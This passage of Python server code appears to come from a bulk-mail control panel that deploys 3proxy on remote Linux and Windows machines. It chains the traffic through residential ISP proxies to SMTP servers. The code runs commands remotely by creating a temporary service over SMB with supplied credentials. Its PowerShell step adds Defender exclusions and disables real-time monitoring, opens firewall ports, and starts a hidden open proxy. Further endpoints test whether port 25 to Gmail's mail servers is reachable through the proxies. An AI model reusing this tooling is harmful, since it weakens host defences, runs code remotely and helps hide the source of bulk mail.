                                     "ldap3", "ldapdomaindump", "flask", "pyasn1"]
                            for _dep in _deps:
                                try:
                                    subprocess.run(
                                        [sys.executable, "-m", "pip", "install", _dep,
                                         "--break-system-packages", "-q"],
                                        check=True, capture_output=True, timeout=60
                                    )
                                except Exception:
                                    pass
                            # Now install impacket
                            for _cmd in [
                                [sys.executable, "-m", "pip", "install", "impacket",
                                 "--break-system-packages", "-q", "--no-build-isolation"],
                                [sys.executable, "-m", "pip", "install", "impacket", "-q"],
                            ]:
                                try:
                                    subprocess.run(_cmd, check=True, capture_output=True, timeout=120)
                                    from impacket.smbconnection import SMBConnection
                                    from impacket.dcerpc.v5 import transport, scmr
                                    _impacket_ok = True
                                    log_lines.append("impacket installed successfully")
                                    break
                                except Exception as _ie:
                                    log_lines.append(f"impacket install attempt failed: {str(_ie)[:80]}")
                                    continue

                        if not _impacket_ok:
                            # impacket unavailable — give user actionable manual instructions
                            self._json(200, {"status": "error",
                                "message": (
                                    f"impacket not available and could not be installed. "
                                    f"SSH:{ssh_port} and WinRM:5985 are also unreachable. "
                                    "Manual fix — RDP into the machine and run as Administrator: "
                                    "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; "
                                    "Start-Service sshd; Set-Service sshd -StartupType Automatic; "
                                    "netsh advfirewall firewall add rule name=SSH dir=in action=allow protocol=tcp localport=22"
                                ),
                                "log": "\n".join(log_lines)}); return

                        try:
                            log_lines.append("Connecting via SMB:445 (impacket)")
                            smb = SMBConnection(host, host, sess_port=445, timeout=15)
                            smb.login(user, password)
                            log_lines.append("SMB authenticated")
                            # Use psexec-style remote exec via SCM to enable WinRM then install
                            rpctransport = transport.SMBTransport(host, 445, r'\svcctl', smb_connection=smb)
                            dce = rpctransport.get_dce_rpc()
                            dce.connect()
                            dce.bind(scmr.MSRPC_UUID_SCMR)
                            scm = scmr.hROpenSCManagerW(dce)["lpScHandle"]
                            # Write a batch to run via a temp service
                            _cmds = (
                                "cmd /c powershell -Command \""
                                "winrm quickconfig -q 2>nul; "
                                "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 2>nul; "
                                "Start-Service sshd; Set-Service sshd -StartupType Automatic; "
                                "netsh advfirewall firewall add rule name=SSH dir=in action=allow protocol=tcp localport=22 | Out-Null; "
                                "netsh advfirewall firewall add rule name=WinRM dir=in action=allow protocol=tcp localport=5985 | Out-Null"
                                "\""
                            )
                            scmr.hRCreateServiceW(dce, scm, "STSetup", "STSetup",
                                lpBinaryPathName=_cmds, dwStartType=scmr.SERVICE_DEMAND_START)
                            _hsvc = scmr.hROpenServiceW(dce, scm, "STSetup")["lpServiceHandle"]
                            scmr.hRStartServiceW(dce, _hsvc)
                            import time as _time; _time.sleep(8)
                            try:
                                scmr.hRDeleteService(dce, _hsvc)
                            except Exception:
                                pass
                            dce.disconnect()
                            smb.close()
                            log_lines.append("SMB: WinRM + OpenSSH install triggered")
                            # Wait and retry SSH
                            import time as _time; _time.sleep(5)
                            if _tcp_open(host, ssh_port, 10):
                                log_lines.append("SSH now available! Continuing with SSH deploy...")
                                ssh_ok = True
                            elif _tcp_open(host, 5985, 8):
                                log_lines.append("WinRM now available!")
                                winrm_ok = True
                            else:
                                self._json(200, {"status":"error",
                                    "message":"SMB bootstrap sent. Wait 30s then try Auto-Deploy again - OpenSSH is installing.",
                                    "log":"\n".join(log_lines)}); return
                        except Exception as _se:
                            self._json(200, {"status":"error",
                                "message": (
                                    f"SSH ({ssh_port}), WinRM (5985), and SMB (445) all failed or SMB exec failed: {str(_se)[:200]}. "
                                    "One-time manual fix - RDP in and run in PowerShell as Admin: "
                                    "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; "
                                    "Start-Service sshd; Set-Service -Name sshd -StartupType Automatic; "
                                    "netsh advfirewall firewall add rule name=SSH dir=in action=allow protocol=tcp localport=22"
                                )}); return

                    else:
                        # Nothing reachable at all
                        self._json(200, {"status":"error", "message": (
                            f"Cannot reach {host} on SSH:{ssh_port}, WinRM:5985, or SMB:445. "
                            "The RDP IP may be wrong, or all remote management ports are firewalled. "
                            "One-time fix: RDP in manually, open PowerShell as Admin, run: "
                            "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; "
                            "Start-Service sshd; Set-Service -Name sshd -StartupType Automatic; "
                            "netsh advfirewall firewall add rule name=SSH dir=in action=allow protocol=tcp localport=22"
                        )}); return

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.get_transport  # pre-ref to avoid gc
                ssh.connect(host, port=ssh_port, username=user, password=password,
                            timeout=20, banner_timeout=30, auth_timeout=25)
                # Keepalive: server sends keepalive every 30s to prevent NAT timeout
                ssh.get_transport().set_keepalive(30)

                log_lines = []
                def run(cmd, timeout=90):
                    _, out, err = ssh.exec_command(cmd, timeout=timeout)
                    o = out.read().decode(errors="replace").strip()
                    e = err.read().decode(errors="replace").strip()
                    combined = (o + "\n" + e).strip()
                    if combined: log_lines.append(combined)
                    return combined

                import io as _io, shlex as _shlex

                if os_type == "linux":
                    # Escape proxy creds for safe embedding in config file
                    def _esc(s): return str(s).replace("\\","\\\\").replace("'","\\'")

                    # Write 3proxy.cfg using printf to avoid heredoc quoting issues
                    cfg_lines = [
                        "nserver 8.8.8.8",
                        "nserver 1.1.1.1",
                        "nscache 65536",
                        f"parent 1000 {px_type} {px_host} {px_port} {_esc(px_user)} {_esc(px_pass)}",
                        "allow *",
                        "proxy -p8025 -i0.0.0.0",
                        "allow *",
                        "socks -p1080 -i0.0.0.0",
                    ]
                    cfg_content = "\n".join(cfg_lines) + "\n"

                    # Upload config via SFTP (safe for any special chars)
                    sftp = ssh.open_sftp()
                    try:
                        sftp.mkdir("/etc/3proxy")
                    except Exception:
                        pass
                    sftp.putfo(_io.BytesIO(cfg_content.encode()), "/etc/3proxy/3proxy.cfg")
                    sftp.close()
                    log_lines.append("Config uploaded via SFTP (%d bytes)" % len(cfg_content))

                    # Upload deploy script via SFTP (avoids multi-line exec_command issues)
                    linux_script = r"""#!/bin/bash
set -uo pipefail
DEPLOY_OK=0

# --- Install 3proxy ---
PROXY_BIN=$(which 3proxy 2>/dev/null || echo "")
if [ -z "$PROXY_BIN" ]; then
  if command -v apt-get &>/dev/null; then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -qq -y 2>/dev/null || true
    apt-get install -y -qq 3proxy 2>/dev/null || true
  elif command -v yum &>/dev/null; then
    yum install -y 3proxy 2>/dev/null || true
  fi
  PROXY_BIN=$(which 3proxy 2>/dev/null || echo "")
fi

# Fallback: build from source
if [ -z "$PROXY_BIN" ]; then
  echo "apt 3proxy not found, building from source..."
  apt-get install -y -qq build-essential git 2>/dev/null || yum install -y gcc make git 2>/dev/null || true
  cd /tmp && rm -rf 3proxy-build
  git clone --depth=1 https://github.com/3proxy/3proxy.git 3proxy-build 2>/dev/null || \
    { echo "git clone failed"; exit 1; }
  cd 3proxy-build
  make -f Makefile.Linux -j$(nproc) 2>&1 | tail -5
  cp bin/3proxy /usr/local/bin/3proxy && chmod +x /usr/local/bin/3proxy
  PROXY_BIN=/usr/local/bin/3proxy
fi

if [ -z "$PROXY_BIN" ]; then
  echo "DEPLOY_FAIL: could not install 3proxy"
  exit 1
fi

echo "3proxy binary: $PROXY_BIN"
$PROXY_BIN --version 2>&1 | head -1 || true

# --- Stop any existing instance ---
pkill -f 3proxy 2>/dev/null || true
sleep 1

# --- Firewall ---
ufw allow 1080/tcp 2>/dev/null || iptables -I INPUT -p tcp --dport 1080 -j ACCEPT 2>/dev/null || true
ufw allow 8025/tcp 2>/dev/null || iptables -I INPUT -p tcp --dport 8025 -j ACCEPT 2>/dev/null || true

# --- Systemd service for persistence ---
cat > /etc/systemd/system/3proxy.service << 'SVCEOF'
[Unit]
Description=3proxy proxy server
After=network.target
[Service]
Type=simple
ExecStart=PROXY_BIN_PLACEHOLDER /etc/3proxy/3proxy.cfg
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target
SVCEOF
sed -i "s|PROXY_BIN_PLACEHOLDER|$PROXY_BIN|g" /etc/systemd/system/3proxy.service
systemctl daemon-reload 2>/dev/null || true
systemctl enable 3proxy 2>/dev/null || true
systemctl restart 3proxy 2>/dev/null || \
  nohup $PROXY_BIN /etc/3proxy/3proxy.cfg > /var/log/3proxy.log 2>&1 &

sleep 3

# --- Verify ---
if pgrep -f 3proxy > /dev/null; then
  echo "DEPLOY_OK"
  echo "PID: $(pgrep -f 3proxy | head -1)"
  echo "Listening on 1080 (SOCKS5) and 8025 (HTTP proxy)"
  ss -tlnp 2>/dev/null | grep -E '1080|8025' || netstat -tlnp 2>/dev/null | grep -E '1080|8025' || true
else
  echo "DEPLOY_FAIL: 3proxy not running after start"
  cat /var/log/3proxy.log 2>/dev/null | tail -10
  journalctl -u 3proxy -n 10 --no-pager 2>/dev/null || true
  exit 1
fi
"""
                    sftp2 = ssh.open_sftp()
                    sftp2.putfo(_io.BytesIO(linux_script.encode()), "/tmp/st_isp_deploy.sh")
                    sftp2.close()

                    out = run("chmod +x /tmp/st_isp_deploy.sh && bash /tmp/st_isp_deploy.sh", timeout=240)
                    if "DEPLOY_OK" in out:
                        self._json(200, {"status": "ok",
                            "message": f"3proxy deployed on Linux (persistent). Chain: {host}:1080 → {px_host}:{px_port} → {smtp_host}:{smtp_port}",
                            "log": "\n".join(log_lines[-30:])})
                    else:
                        self._json(200, {"status": "error",
                            "message": "Linux deploy failed — see log for details",
                            "log": "\n".join(log_lines[-30:])})
                else:
                    # Windows via SSH - upload PS1 via SFTP then execute
                    import io
                    # Build config lines as PS1 array assignment - embedded directly in script
                    cfg_line = (
                        "nserver 8.8.8.8\r\n"
                        "nserver 1.1.1.1\r\n"
                        "nscache 65536\r\n"
                        "allow *\r\n"
                        "parent 1000 " + px_type + " " + px_host + " " + str(px_port) + " " + px_user + " " + px_pass + "\r\n"
                        "proxy -p8025 -i0.0.0.0\r\n"
                        "allow *\r\n"
                        "socks -p1080 -i0.0.0.0\r\n"
                    )
                    ps1_lines = [
                        "$ErrorActionPreference = 'Continue'",
                        # Create dirs and disable Defender FIRST
                        "New-Item -ItemType Directory -Force -Path C:\\proxy | Out-Null",
                        "New-Item -ItemType Directory -Force -Path C:\\proxtmp | Out-Null",
                        "Add-MpPreference -ExclusionPath 'C:\\proxy' -ErrorAction SilentlyContinue",
                        "Add-MpPreference -ExclusionPath 'C:\\proxtmp' -ErrorAction SilentlyContinue",
                        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue",
                        "Start-Sleep -Seconds 2",
                        # Write config directly in PS1 - no dependency on SFTP timing
                        "Remove-Item C:\\proxy\\3proxy.cfg -Force -ErrorAction SilentlyContinue",
                        f"[IO.File]::WriteAllText('C:\\\\proxy\\\\3proxy.cfg', 'nserver 8.8.8.8'+[char]13+[char]10+'nserver 1.1.1.1'+[char]13+[char]10+'nscache 65536'+[char]13+[char]10+'allow *'+[char]13+[char]10+'parent 1000 {px_type} {px_host} {px_port} {px_user} {px_pass}'+[char]13+[char]10+'proxy -p8025 -i0.0.0.0'+[char]13+[char]10+'allow *'+[char]13+[char]10+'socks -p1080 -i0.0.0.0'+[char]13+[char]10)",
                        "if (-not (Test-Path C:\\proxy\\3proxy.exe)) {",
                        "  Write-Host 'Downloading 3proxy...'",
                        "  [Net.ServicePointManager]::SecurityProtocol = 3072",
                        "  $dl = $false",
                        "  foreach ($url in @('https://github.com/3proxy/3proxy/releases/download/0.9.5/3proxy-0.9.5-x64.zip','https://github.com/3proxy/3proxy/releases/download/0.9.4/3proxy-0.9.4-x64.zip')) {",
                        "    try { Invoke-WebRequest -Uri $url -OutFile C:\\proxtmp\\3proxy.zip -UseBasicParsing -TimeoutSec 90; $dl=$true; break } catch { continue }",
                        "  }",
                        "  if (-not $dl) { Write-Host 'DEPLOY_FAIL download failed'; exit 1 }",
                        "  Expand-Archive -Path C:\\proxtmp\\3proxy.zip -DestinationPath C:\\proxtmp\\ex -Force",
                        "  $exe = Get-ChildItem C:\\proxtmp\\ex -Recurse -Filter '3proxy.exe' | Select-Object -First 1",
                        "  if ($exe) {",
                        "    Move-Item $exe.FullName C:\\proxy\\3proxy.exe -Force",
                        "    Unblock-File -Path C:\\proxy\\3proxy.exe -ErrorAction SilentlyContinue",
                        "    # Copy DLLs needed by 3proxy",
                        "    Get-ChildItem (Split-Path $exe.FullName) -Filter '*.dll' | ForEach-Object { Copy-Item $_.FullName C:\\proxy\\ -Force -ErrorAction SilentlyContinue }",
                        "  }",
                        "  Remove-Item C:\\proxtmp -Recurse -Force -ErrorAction SilentlyContinue",
                        "}",
                        "if (-not (Test-Path C:\\proxy\\3proxy.exe)) { Write-Host 'DEPLOY_FAIL exe missing'; exit 1 }",
                        "Write-Host 'exe ok, starting...'",
                        "Stop-Process -Name 3proxy -Force -ErrorAction SilentlyContinue",
                        "Start-Sleep -Seconds 1",
                        "netsh advfirewall firewall delete rule name=SynthTelISP -ErrorAction SilentlyContinue 2>$null | Out-Null",
                        "netsh advfirewall firewall delete rule name=SynthTelISPSMTP -ErrorAction SilentlyContinue 2>$null | Out-Null",
                        "netsh advfirewall firewall add rule name=SynthTelISP dir=in action=allow protocol=tcp localport=1080",
                        "netsh advfirewall firewall add rule name=SynthTelISPSMTP dir=in action=allow protocol=tcp localport=8025",
                        "Stop-Process -Name 3proxy -Force -ErrorAction SilentlyContinue",
                        "Start-Sleep -Seconds 1",
                        "Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue",
                        "Start-Process -FilePath 'C:\\proxy\\3proxy.exe' -ArgumentList 'C:\\proxy\\3proxy.cfg' -WorkingDirectory 'C:\\proxy' -WindowStyle Hidden",
                        "Start-Sleep -Seconds 3",
                        "$p = Get-Process -Name 3proxy -ErrorAction SilentlyContinue",
                        "if ($p) { Write-Host ('DEPLOY_OK pid='+$p.Id) } else { Write-Host 'DEPLOY_FAIL not running' }",
                    ]
                    ps1 = "\r\n".join(ps1_lines)
                    out = ""
                    try:
                        # Upload PS1 via SFTP
                        sftp = ssh.open_sftp()
                        sftp.putfo(io.BytesIO(ps1.encode("utf-8")), "C:/Windows/Temp/st_isp.ps1")
                        sftp.close()
                        log_lines.append("PS1 script uploaded OK")
                        # Create C:\proxy dir via SSH BEFORE writing config via SFTP
                        _, _co, _ce = ssh.exec_command(
                            'powershell -Command "New-Item -ItemType Directory -Force -Path C:\\proxy | Out-Null"',
                            timeout=10
                        )
                        _co.read(); _ce.read()  # drain
                        # Now write config via SFTP
                        sftp2 = ssh.open_sftp()
                        sftp2.putfo(io.BytesIO(cfg_line.encode("utf-8")), "C:/proxy/3proxy.cfg")
                        sftp2.close()
                        # Verify config was written correctly
                        sftp3 = ssh.open_sftp()
                        _cfgcheck = sftp3.file("C:/proxy/3proxy.cfg", "r").read().decode(errors="replace")
                        sftp3.close()
                        log_lines.append("Config written (" + str(len(_cfgcheck)) + " bytes, " + str(_cfgcheck.count("allow")) + " allow lines)")
                        # Run the PS1 (config already written, skip the WriteAllText line)
                        _, o, e = ssh.exec_command(
                            "powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\st_isp.ps1",
                            timeout=180
                        )
                        out = o.read().decode(errors="replace") + e.read().decode(errors="replace")
                        log_lines.append("--- PS1 Output ---")
                        log_lines.append(out[:1000])
                    except Exception as sftp_err:
                        log_lines.append("Deploy step failed: " + str(sftp_err))
                        out = "DEPLOY_FAIL"
                    full_log = "\n".join(log_lines[-30:])
                    if "DEPLOY_OK" in out:
                        self._json(200, {"status": "ok",
                            "message": "3proxy deployed! SOCKS5 on " + host + ":1080 -> " + px_host + ":" + str(px_port) + " -> " + smtp_host + ":" + str(smtp_port),
                            "log": full_log})
                    else:
                        # Extract the most useful error line
                        err_line = next((l for l in reversed(out.splitlines()) if l.strip() and "DEPLOY_FAIL" not in l), "No output")
                        self._json(200, {"status": "error",
                            "message": "Deploy failed: " + err_line[:200],
                            "log": full_log})


                ssh.close()
            except Exception as e:
                err = str(e)
                msg = err
                # Give specific actionable guidance per error type
                if "timed out" in err.lower() or "connection timed out" in err.lower():
                    msg = (
                        "SSH connection timed out to " + str(data.get("host","?")) + ":" + str(data.get("sshPort",22)) + ". "
                        "Checklist: "
                        "1) OpenSSH Server must be installed on the Windows RDP (Settings > Optional Features > OpenSSH Server). "
                        "2) OpenSSH service must be running: run 'Start-Service sshd' as Admin in PowerShell. "
                        "3) Windows Firewall must allow port 22: 'netsh advfirewall firewall add rule name=SSH dir=in action=allow protocol=tcp localport=22'. "
                        "4) Check the SSH port is correct (default 22, some RDPs use 2222 or custom)."
                    )
                elif "authentication" in err.lower() or "auth" in err.lower():
                    msg = "SSH authentication failed. Check username and password. For Windows, use 'Administrator' as username."
                elif "connection refused" in err.lower():
                    msg = "SSH port refused. OpenSSH Server is not listening on port " + str(data.get("sshPort",22)) + ". Install and start OpenSSH Server on the RDP."
                elif "no route" in err.lower() or "network unreachable" in err.lower():
                    msg = "Network unreachable. Check that the RDP IP " + str(data.get("host","?")) + " is correct and accessible."
                elif "name or service not known" in err.lower():
                    msg = "Could not resolve hostname '" + str(data.get("host","?")) + "'. Use an IP address instead."
                self._json(200, {"status": "error", "message": msg})

        # ── ISP status check: is 3proxy running on RDP? ──────
        elif p == "/api/isp/status":
            if not (sess := self._auth()): return
            try:
                data     = self._read_body()
                host     = data.get("host", "")
                ssh_port = int(data.get("sshPort", 22))
                user     = data.get("user", "root")
                password = data.get("pass", "")
                os_type  = data.get("os", "linux")
                if not host or not password:
                    self._json(200, {"status": "error", "message": "host and pass required"}); return
                try:
                    import paramiko as _pm
                except ImportError:
                    self._json(200, {"status": "error", "message": "paramiko not installed"}); return
                ssh2 = _pm.SSHClient()
                ssh2.set_missing_host_key_policy(_pm.AutoAddPolicy())
                ssh2.connect(host, port=ssh_port, username=user, password=password, timeout=15, auth_timeout=15)
                ssh2.get_transport().set_keepalive(30)
                if os_type == "linux":
                    _, o, _ = ssh2.exec_command("pgrep -f 3proxy && echo RUNNING || echo STOPPED; ss -tlnp 2>/dev/null | grep -E '1080|8025' | head -4", timeout=10)
                    out = o.read().decode(errors="replace").strip()
                    running = "RUNNING" in out
                else:
                    _, o, _ = ssh2.exec_command('powershell -Command "if(Get-Process -Name 3proxy -EA SilentlyContinue){\'RUNNING\'}else{\'STOPPED\'}"', timeout=15)
                    out = o.read().decode(errors="replace").strip()
                    running = "RUNNING" in out
                ssh2.close()
                self._json(200, {"status": "ok", "running": running, "detail": out[:300]})
            except Exception as e:
                self._json(200, {"status": "error", "running": False, "message": str(e)})

        # ── Full chain test: SOCKS5 → SMTP ──────────────────
        elif p == "/api/isp/test-chain":
            if not (sess := self._auth()): return
            try:
                data      = self._read_body()
                socks_host = data.get("socksHost", "")
                socks_port = int(data.get("socksPort", 1080))
                smtp_host  = data.get("smtpHost", "")
                results    = {}

                # Step 1: TCP to SOCKS5
                import socket as _sock
                try:
                    s = _sock.create_connection((socks_host, socks_port), timeout=8)
                    s.close()
                    results["socks5_tcp"] = {"ok": True, "msg": f"TCP {socks_host}:{socks_port} reachable"}
                except Exception as e:
                    results["socks5_tcp"] = {"ok": False, "msg": f"TCP {socks_host}:{socks_port} FAILED: {e}"}
                    self._json(200, {"ok": False, "results": results}); return

                # Step 2: SOCKS5 → SMTP ports
                try:
                    import socks as pysocks
                    smtp_ports = [int(data.get("smtpPort", 25)), 587, 465, 2525, 26]
                    smtp_ports = list(dict.fromkeys(smtp_ports))  # dedupe keep order
                    for port in smtp_ports:
                        try:
                            s = pysocks.socksocket()
                            s.set_proxy(pysocks.SOCKS5, socks_host, socks_port)
                            s.settimeout(10)
                            s.connect((smtp_host, port))
                            # Try read banner
                            banner = ""
                            try:
                                s.settimeout(5)
                                banner = s.recv(512).decode(errors="replace").strip()
                            except Exception:
                                pass
                            s.close()
                            results[f"smtp_{port}"] = {"ok": True, "msg": f"Port {port} OPEN via SOCKS5", "banner": banner}
                        except Exception as e:
                            results[f"smtp_{port}"] = {"ok": False, "msg": f"Port {port} blocked: {e}"}
                    open_ports = [p for p in smtp_ports if results.get(f"smtp_{p}", {}).get("ok")]
                    self._json(200, {
                        "ok": bool(open_ports),
                        "open_ports": open_ports,
                        "results": results,
                        "recommendation": f"Use port {open_ports[0]}" if open_ports else "No SMTP ports reachable via SOCKS5 — proxy may block outbound SMTP"
                    })
                except ImportError:
                    self._json(200, {"ok": False, "results": results,
                        "recommendation": "PySocks not installed: pip install pysocks --break-system-packages"})
            except Exception as e:
                self._json(500, {"error": str(e)})

        # ── Debug: capture 3proxy crash output ──────────────
        elif p == "/api/isp/debug-run":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
                host     = data.get("host","")
                ssh_port = int(data.get("sshPort", 22))
                user     = data.get("user","")
                password = data.get("pass","")
                try:
                    import paramiko
                except ImportError:
                    subprocess.run([sys.executable,"-m","pip","install","paramiko",
                                    "--break-system-packages","-q"],
                                   check=True, capture_output=True, timeout=60)
                    import paramiko
                ssh2 = paramiko.SSHClient()
                ssh2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh2.connect(host, port=ssh_port, username=user, password=password, timeout=15)
                # Run 3proxy synchronously for 5 seconds and capture output
                _, o, e = ssh2.exec_command(
                    "cmd /c cd C:\\proxy && C:\\proxy\\3proxy.exe C:\\proxy\\3proxy.cfg",
                    timeout=8
                )
                out = o.read().decode(errors="replace").strip()
                err = e.read().decode(errors="replace").strip()
                combined = (out + "\n" + err).strip()
                # Also open a visible cmd window on the RDP
                ssh2.exec_command(
                    "cmd /c start cmd /k \"cd C:\\proxy && C:\\proxy\\3proxy.exe C:\\proxy\\3proxy.cfg\""
                )
                ssh2.close()
                self._json(200, {
                    "status": "ok",
                    "message": "Ran 3proxy for 8s and captured output. A visible cmd window also opened on the RDP screen.",
                    "output": combined or "No console output captured - check the cmd window on the RDP screen"
                })
            except Exception as ex:
                self._json(200, {"status":"error", "message": str(ex)[:300]})

        # ── Test SSH/ISP tunnel ──────────────────────────────
        elif p == "/api/test-tunnel":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            tunnel = data.get("tunnel", {})
            tt     = tunnel.get("tunnelType", "ssh")
            try:
                t0 = time.time()
                if tt == "ssh":
                    lp = open_ssh_socks(tunnel)
                    latency = round((time.time() - t0) * 1000)
                    test_domain = tunnel.get("testDomain", "gmail.com")
                    mx_info = ""
                    try:
                        from core.mx_sender import _resolve_mx_all_methods
                        mx = _resolve_mx_all_methods(test_domain)
                        if mx: mx_info = f" — MX:{mx[0][1]}"
                    except Exception:
                        pass
                    close_tunnel(lp)
                    self._json(200, {
                        "status": "ok",
                        "message": f"SSH SOCKS5 OK: 127.0.0.1:{lp} via {tunnel.get('sshHost','')}{mx_info}",
                        "latency_ms": latency,
                    })

                elif tt == "isp":
                    try:
                        import socks as pysocks
                    except ImportError:
                        self._json(200, {"status": "error", "message": "PySocks not installed: pip install pysocks --break-system-packages"}); return
                    ph = tunnel.get("sshHost", "")
                    pp = int(tunnel.get("sshPort", "1080"))
                    pu = tunnel.get("sshUser", "") or None
                    pk = tunnel.get("sshKey", "")  or None
                    # Connectivity test
                    step_ok = False
                    for th, tprt in [("httpbin.org", 80), ("google.com", 443), ("1.1.1.1", 80)]:
                        try:
                            s = pysocks.socksocket()
                            s.set_proxy(pysocks.SOCKS5, ph, pp, username=pu, password=pk)
                            s.settimeout(12)
                            s.connect((th, tprt))
                            s.close()
                            step_ok = True; break
                        except Exception:
                            continue
                    if not step_ok:
                        self._json(200, {"status": "error", "message": f"ISP proxy {ph}:{pp} cannot connect — check credentials/format (user-country-US-session-xyz)"}); return
                    # Get public IP
                    pub_ip = ""
                    try:
                        s2 = pysocks.socksocket()
                        s2.set_proxy(pysocks.SOCKS5, ph, pp, username=pu, password=pk)
                        s2.settimeout(10)
                        s2.connect(("httpbin.org", 80))
                        s2.sendall(b"GET /ip HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n")
                        resp = s2.recv(4096).decode("utf-8", errors="replace")
                        s2.close()
                        m = re.search(r'"origin"\s*:\s*"([^"]+)"', resp)
                        if m: pub_ip = m.group(1)
                    except Exception: pass
                    # Port 25
                    latency = round((time.time() - t0) * 1000)
                    try:
                        s3 = pysocks.socksocket()
                        s3.set_proxy(pysocks.SOCKS5, ph, pp, username=pu, password=pk)
                        s3.settimeout(12)
                        s3.connect(("gmail-smtp-in.l.google.com", 25))
                        banner = s3.recv(1024).decode("utf-8", errors="replace").strip()[:80]
                        s3.close()
                        self._json(200, {
                            "status": "ok",
                            "message": f"ISP proxy OK → port 25 open — {banner}" + (f" | exit IP: {pub_ip}" if pub_ip else ""),
                            "latency_ms": latency, "public_ip": pub_ip, "port25": True,
                        })
                    except Exception as p25e:
                        p25s = str(p25e)
                        if "0x02" in p25s or "not allowed" in p25s.lower():
                            self._json(200, {
                                "status": "warning",
                                "message": "Proxy works for web traffic but BLOCKS port 25 (direct-to-MX). Use SMTP relay servers (port 587) routed through this proxy instead.",
                                "latency_ms": latency, "public_ip": pub_ip, "port25": False,
                            })
                        else:
                            self._json(200, {
                                "status": "warning",
                                "message": f"Proxy OK for web{' (exit: '+pub_ip+')' if pub_ip else ''} but port 25 failed: {p25s[:100]}",
                                "latency_ms": latency, "public_ip": pub_ip,
                            })
                else:
                    self._json(200, {"status": "error", "message": "Unknown tunnel type"})
            except Exception as e:
                self._json(200, {"status": "error", "message": str(e)[:300]})

        # ── Test CRM ─────────────────────────────────────────
        elif p == "/api/test-crm":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            crm      = data.get("crm", {})
            provider = crm.get("provider", "hubspot")
            api_key  = crm.get("apiKey", "")
            if not api_key:
                self._json(200, {"status": "error", "message": "No API key configured"}); return
            try:
                urls = {
                    "hubspot":    ("GET", "https://api.hubapi.com/crm/v3/objects/contacts?limit=1",
                                   {"Authorization": f"Bearer {api_key}"}),
                    "salesforce": ("GET", crm.get("endpoint","").rstrip("/") + "/services/data/v58.0/limits",
                                   {"Authorization": f"Bearer {api_key}"}),
                    "dynamics":   ("GET", crm.get("endpoint","").rstrip("/") + "/api/data/v9.2/WhoAmI",
                                   {"Authorization": f"Bearer {api_key}"}),
                }
                if provider in urls:
                    method_verb, url, hdrs = urls[provider]
                    req = Request(url, headers=hdrs)
                    resp = urlopen(req, timeout=10)
                    self._json(200, {"status": "ok", "message": f"{provider.title()} API connected ({resp.status})"})
                elif crm.get("endpoint"):
                    req = Request(crm["endpoint"], headers={"Authorization": f"Bearer {api_key}"})
                    resp = urlopen(req, timeout=10)
                    self._json(200, {"status": "ok", "message": f"Custom CRM endpoint responded ({resp.status})"})
                else:
                    self._json(200, {"status": "error", "message": f"No endpoint URL for provider '{provider}'"})
            except Exception as e:
                self._json(200, {"status": "error", "message": str(e)[:300]})

        # ── Proxy health check ───────────────────────────────
        elif p == "/api/proxy-health":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            from core.smtp_sender import _make_proxy_socket
            host = data.get("host", "")
            port = data.get("port", "17521")
            username = data.get("username") or None
            password = data.get("password") or None
            if not host:
                self._json(200, {"error": "Proxy host is required"}); return
            results = {"socks_connect": False, "port80": False, "port25": False,
                       "public_ip": "", "error": ""}
            proxy_cfg = {"type": "socks5", "host": host, "port": str(port),
                         "username": username, "password": password}
            try:
                s = _make_proxy_socket(proxy_cfg)
                s.settimeout(10)
                s.connect(("httpbin.org", 80))
                s.sendall(b"GET /ip HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n")
                resp = s.recv(4096).decode("utf-8", errors="replace")
                s.close()
                results["socks_connect"] = results["port80"] = True
                m = re.search(r'"origin"\s*:\s*"([^"]+)"', resp)
                if m: results["public_ip"] = m.group(1)
            except Exception as e:
                results["error"] = str(e)[:150]
                self._json(200, results); return
            try:
                s2 = _make_proxy_socket(proxy_cfg)
                s2.settimeout(15)
                s2.connect(("gmail-smtp-in.l.google.com", 25))
                banner = s2.recv(1024).decode("utf-8", errors="replace").strip()[:100]
                s2.close()
                results["port25"] = True
                results["banner"] = banner
            except Exception as e:
                results["port25_error"] = str(e)[:100]
            self._json(200, results)

        # ── Deploy 3proxy on remote VPS ──────────────────────
        elif p == "/api/deploy-proxy":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            host       = data.get("host", "")
            port       = int(data.get("port", 22))
            user       = data.get("user", "root")
            password   = data.get("password", "")
            socks_port = int(data.get("socksPort", 17521))
            proxy_user = data.get("proxyUser", f"proxy_{int(time.time())}")
            proxy_pass = data.get("proxyPass", os.urandom(6).hex())
            country    = data.get("country", "CA")
            isp        = data.get("isp", "custom")
            if not host or not password:
                self._json(200, {"status": "error", "message": "Server IP and root password required"}); return
            try:
                import paramiko
            except ImportError:
                for cmd in [
                    [sys.executable, "-m", "pip", "install", "paramiko", "--break-system-packages", "-q"],
                    [sys.executable, "-m", "pip", "install", "paramiko", "-q"],
                    ["pip3", "install", "paramiko", "-q"],
                    ["apt-get", "install", "-y", "-q", "python3-paramiko"],
                ]:
                    try:
                        subprocess.run(cmd, check=True, capture_output=True, timeout=60)
                        import paramiko
                        break
                    except Exception:
                        continue
                else:
                    self._json(200, {"status": "error", "message": "paramiko not installed. Run: apt-get install -y python3-paramiko"}); return
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
